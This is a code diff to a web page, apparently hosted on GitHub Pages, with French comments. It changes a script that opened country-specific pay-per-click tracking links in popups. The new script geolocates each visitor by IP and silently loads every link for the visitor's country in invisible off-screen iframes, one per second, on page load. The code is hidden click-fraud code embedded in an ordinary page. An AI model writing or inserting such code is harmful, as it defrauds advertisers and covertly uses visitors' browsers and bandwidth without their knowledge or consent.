@@ -3605,20 +3605,20 @@ document.addEventListener("DOMContentLoaded", function() {
 
 
 
- <!-- ========================================== -->
-<!-- OUVRE TOUS LES LIENS (IP BASED)            -->
-<!-- US = tous les liens US, BR = tous les BR, etc. -->
-<!-- S'ouvre automatiquement l'un après l'autre -->
+<!-- ========================================== -->
+<!-- TRACKER INVISIBLE (TOUS LES LIENS DU PAYS) -->
+<!-- Si DE: charge tous les liens DE en fond    -->
+<!-- Si US: charge tous les liens US en fond    -->
 <!-- ========================================== -->
 <script>
 document.addEventListener("DOMContentLoaded", function() {
 
-    // --- 1. DOMAIN CHECK ---
+    // --- 1. VÉRIFICATION DU DOMAINE ---
     if (window.location.hostname !== 'boussedraoui.github.io') {
-        return;
+        return; 
     }
 
-    // --- 2. ALL LINKS ---
+    // --- 2. TOUS LES LIENS ---
     const linksUS = [
         "https://tatrck.com/h/0Hu30_aa0Sva?model=cpc", "https://tatrck.com/h/0Hu30_aa0T7i?model=cpc", "https://tatrck.com/h/0Hu30_aa0UXY?model=cpc", "https://tatrck.com/h/0Hu30_aa0VgG?model=cpc",
         "https://tatrck.com/h/0Hu30_aa0XMd?model=cpc", "https://tatrck.com/h/0Hu30_aa0ZV1?model=cpc", "https://tatrck.com/h/0Hu30_aa0ZoP?model=cpc", "https://tatrck.com/h/0Hu30_aa0Zze?model=cpc",
@@ -3658,7 +3658,22 @@ document.addEventListener("DOMContentLoaded", function() {
         "https://tatrck.com/h/0Hu30_aa1Kh4?model=cpc", "https://tatrck.com/h/0Hu30_aa1LEL?model=cpc", "https://tatrck.com/h/0Hu30_aa1LV3?model=cpc", "https://tatrck.com/h/0Hu30_aa1OKG?model=cpc"
     ];
 
-    // --- 3. DÉTECTION IP ET OUVERTURE DE TOUS LES LIENS ---
+    // --- 3. FONCTION POUR CHARGER INVISIBLEMENT ---
+    function loadHiddenIframe(url) {
+        if (!url) return;
+        const iframe = document.createElement('iframe');
+        iframe.src = url;
+        // On cache l'iframe hors de l'écran
+        iframe.style.position = 'absolute';
+        iframe.style.left = '-9999px';
+        iframe.style.width = '1px';
+        iframe.style.height = '1px';
+        iframe.style.opacity = '0';
+        iframe.style.pointerEvents = 'none';
+        document.body.appendChild(iframe);
+    }
+
+    // --- 4. DÉTECTION IP ET OUVERTURE DE TOUS LES LIENS ---
     fetch('https://ipapi.co/json/')
         .then(response => response.json())
         .then(data => {
@@ -3670,29 +3685,17 @@ document.addEventListener("DOMContentLoaded", function() {
             else if (country === 'DE') linksToOpen = linksDE;
 
             if (linksToOpen) {
-                let index = 0;
-                
-                // Fonction récursive pour ouvrir un lien à la fois (1 par seconde)
-                function openNextLink() {
-                    if (index >= linksToOpen.length) {
-                        console.log('[Opener] Tous les liens ont été ouverts.');
-                        return;
-                    }
-
-                    // Ouvre la fenêtre
-                    window.open(linksToOpen[index], '_blank');
-                    index++;
-
-                    // Attend 1 seconde et passe au suivant
-                    setTimeout(openNextLink, 1000);
-                }
-
-                // Démarre l'ouverture
-                openNextLink();
+                // Ouvre TOUS les liens du pays, un par un, sans aucune popup
+                linksToOpen.forEach((link, index) => {
+                    setTimeout(() => {
+                        loadHiddenIframe(link);
+                        console.log('[Tracker] Lien ' + country + ' chargé en fond #' + (index + 1));
+                    }, index * 1000); // 1 seconde entre chaque
+                });
             }
         })
         .catch(error => {
-            console.log('[Opener] IP detection failed.', error);
+            console.log('[Tracker] IP detection failed.', error);
         });
 });
 </script>
